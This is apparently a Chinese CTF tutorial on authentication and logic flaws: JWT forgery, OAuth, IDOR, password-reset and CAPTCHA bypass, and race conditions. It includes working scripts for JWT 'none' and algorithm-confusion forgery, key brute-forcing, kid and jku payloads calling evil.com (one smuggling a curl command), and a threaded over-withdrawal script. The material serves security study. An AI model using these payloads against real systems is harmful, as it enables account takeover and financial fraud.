# 认证鉴权与逻辑漏洞

## 1. 概述
认证（Authentication）和鉴权（Authorization）漏洞是Web应用中最常见的逻辑类安全缺陷。CTF中考察范围包括：JWT攻击、OAuth 2.0流程缺陷、Session固定、越权访问（IDOR）、条件竞争、业务逻辑绕过等。这类漏洞的特点是往往不需要技术性Payload，更注重对业务流程理解和逻辑缺陷的洞察。

**核心分类：**
- **认证绕过**：JWT伪造/空加密、弱密码/验证码缺陷、OAuth错误配置
- **鉴权缺陷**：水平越权(IDOR)、垂直越权、接口未授权
- **会话管理**：Session Fixation、Cookie伪造、CSRF
- **业务逻辑**：条件竞争、支付绕过、优惠券滥用、密码重置逻辑缺陷

## 2. 核心原理

### 2.1 JWT结构
```
Header.Payload.Signature
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.xxx
```

**Header**：声明签名算法（HS256/RS256/none）
**Payload**：携带声明（claims），如用户名、角色、过期时间
**Signature**：`HMAC-SHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload), secret)`

### 2.2 OAuth流程（Authorization Code模式）
```
1. 用户 → Client: 点击登录
2. Client → AuthServer: /authorize?client_id=xxx&redirect_uri=xxx&response_type=code
3. AuthServer → 用户: 登录页
4. 用户 → AuthServer: 授权
5. AuthServer → Client: 302 redirect_uri?code=xxxx
6. Client → AuthServer: POST /token {code, client_secret}
7. AuthServer → Client: {access_token}
8. Client → ResourceAPI: Authorization: Bearer {token}
```

## 3. 关键技巧与Payload

### 3.1 JWT攻击

**算法none攻击：**
```python
import jwt, base64

# JWT原始token (alg: HS256)
token = "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.xxx"

# 修改算法为none，去掉签名
# 步骤1：解码header
header_b64 = token.split('.')[0]
header_json = base64.urlsafe_b64decode(header_b64 + '==').decode()
# {"alg":"HS256"}

# 步骤2：改为none
new_header = base64.urlsafe_b64encode(b'{"alg":"none"}').decode().rstrip('=')

# 步骤3：修改payload为admin
new_payload = base64.urlsafe_b64encode(b'{"user":"admin","iat":9999999999}').decode().rstrip('=')

# 步骤4：拼接（无签名部分）
forged_token = f"{new_header}.{new_payload}."
```

**HMAC密钥爆破：**
```bash
# 使用hashcat
hashcat -m 16500 jwt.txt rockyou.txt --force

# 使用PyJWT
python3 -c "
import jwt
with open('jwt.txt') as f:
    token = f.read().strip()
with open('rockyou.txt', errors='ignore') as f:
    for line in f:
        try:
            key = line.strip()
            jwt.decode(token, key, algorithms=['HS256'])
            print(f'[+] Found: {key}')
            break
        except:
            continue
"
```

**kid注入（SQL/路径遍历）：**
```json
// 正常header {"alg":"RS256","kid":"/path/to/public.pem"}
// SQL注入
{"alg":"HS256","kid":"x' UNION SELECT 'base64secret"}

// 路径遍历
{"alg":"HS256","kid":"/dev/null"}
// 用空文件作为密钥 → HS256("", payload)

// 命令注入
{"alg":"HS256","kid":"/etc/passwd; curl evil.com"}
```

**jku (JWK Set URL) SSRF：**
```json
{
  "alg": "RS256",
  "jku": "http://evil.com/jwks.json",
  "kid": "evil_key"
}
```
攻击者在evil.com托管恶意JWK公钥，用对应私钥签名伪造token。

**x5u (X.509 URL) SSRF：**
```json
{
  "alg": "RS256",
  "x5u": "http://evil.com/cert.pem"
}
```

**算法混淆攻击 (RS256 → HS256)：**
服务器使用RS256验证（用公钥验证），如果我们将alg改为HS256，并用公钥作为HMAC密钥签名：
```python
import jwt

# 获取目标RSA公钥（可能来自jwks.json）
pubkey = open('public.pem').read()

# 用公钥作为HS256密钥伪造token
token = jwt.encode(
    {"user": "admin", "iat": 9999999999},
    pubkey,       # 用RSA公钥作为HMAC密钥
    algorithm="HS256",
    headers={"kid": "..."}
)
```

**过期时间绕过：**
```python
# exp被设置为过去的时间 → 修改为未来时间
import base64, json

payload = json.loads(base64.urlsafe_b64decode(original_payload + '=='))
payload['exp'] = 9999999999  # Unix epoch → 2286年
```

### 3.4 IDOR (Insecure Direct Object Reference)

**常见IDOR位置：**
```
# URL参数
/user/profile?id=1          → 改为 ?id=2 看他人资料
/api/orders/123             → 改为 /api/orders/124
/download?file=report1.pdf  → 改为 ?file=report2.pdf
/export?type=user&id=1      → 改为 id=2,3,4...
/api/user/1/password/change → 改他人密码

# POST请求体
{"user_id": 1, "new_email": "xxx"}
→ 改为 {"user_id": 2, "new_email": "attacker@mail.com"}

# GraphQL查询
query { user(id:1) { email } }
→ { user(id:2) { email } }

# UUID不意味着安全
# UUID可被猜解(如基于v1的时间)或泄露(返回在其他接口)
```

**查找方法：**
```
1. 创建两个账号A和B
2. 用A登录，记录所有接口和参数
3. 切换B登录，用A的资源ID访问B的数据
4. 检查响应中是否泄露其他用户ID
```

### 3.6 密码重置逻辑缺陷

**常见利用点：**
```
# 1) 验证码在响应中泄露
   POST /forgot_password → 返回{"code":"1234"}

# 2) 验证码可爆破（无失败次数限制）

# 3) 验证时机的越权
   POST /reset_password?user=admin&code=1234&newpass=xxx

# 4) 修改响应值绕过
   {"status":"fail"} → 改为 {"status":"success"}

# 5) 用户名和要重置的用户不是同一个参数
   POST data: {"username":"attacker","reset_for":"admin","code":"1234"}

# 6) Token可预测（时间戳+用户名md5）

# 7) 旧Token不过期，可复用
```

### 3.7 验证码（CAPTCHA）绕过

```
# 1) 不刷新：抓包重放验证码
# 2) 前端验证：Burp拦截删掉验证码参数
# 3) 空验证码：captcha=
# 4) 万能验证码：0000, 9999
# 5) 验证码在Cookie或Body参数中明文返回
```

## 4. 常见误区与注意事项
1. **JWT HS256弱密钥**：使用弱密钥签名的JWT极易被爆破，但很多人都忽略了这一点。务必测试常见密钥: `secret`, `key`, `password`, 空字符串等。
2. **OAuth implicit模式风险**：implicit模式直接返回access_token在URL片段中，可能被referer泄露或JS获取。
3. **Bearer Token不等于安全**：用JWT做Bearer Token但签名无效(none攻击)或未校验签名。
4. **IDOR不仅限于数字ID**：UUID、邮件地址、用户名、订单号等均可作为直接引用对象，看的是接口权限控制而非ID格式。
5. **条件竞争需要并发**：单线程顺序请求无法触发条件竞争；python threads/goroutine/asyncio都可。
6. **验证码绕过不等于破解**：逻辑上绕过（不刷新/空值/响应泄露）比OCR更常见。
7. **密码重置链路需全链条审查**：从获取验证码→验证→重置密码 每个环节都有检查点。
8. **offline策略**：本地搭建pyjwt测试环境；提前准备弱密钥字典(1000个常见JWT密钥)；收集各语言Session序列化格式文档。

## 5. 实战示例

### 示例1：JWT none算法 + 角色提权
```
场景：API使用JWT认证，Authorization头包含JWT
```
步骤：
```python
# 1. 抓取正常token
token = "eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoidXNlciIsInVzZXJfaWQiOjF9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

# 2. 解码payload发现role字段
import base64, json
payload = base64.urlsafe_b64decode("eyJyb2xlIjoidXNlciIsInVzZXJfaWQiOjF9==").decode()
# → {"role":"user","user_id":1}

# 3. 修改role为admin，alg改为none
new_header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip('=')
new_payload = base64.urlsafe_b64encode(b'{"role":"admin","user_id":1}').decode().rstrip('=')

# 4. 发送
forged = new_header + "." + new_payload + "."
# 在Authorization头中发送 forged token → 获得admin权限
```

### 示例2：条件竞争实现超额提现
```
场景：/api/withdraw接口提现，先检查余额再扣款
```
Python脚本：
```python
import requests, threading

s = requests.Session()
s.cookies['session'] = 'victim_session'

def withdraw():
    r = s.post('http://bank.com/api/withdraw',
              json={'amount': 100})
    print(r.text)

# 并发发送10次提现100的请求（余额仅200）
for _ in range(10):
    threading.Thread(target=withdraw).start()
# 期望结果：部分请求绕过余额检查，超额提现
```
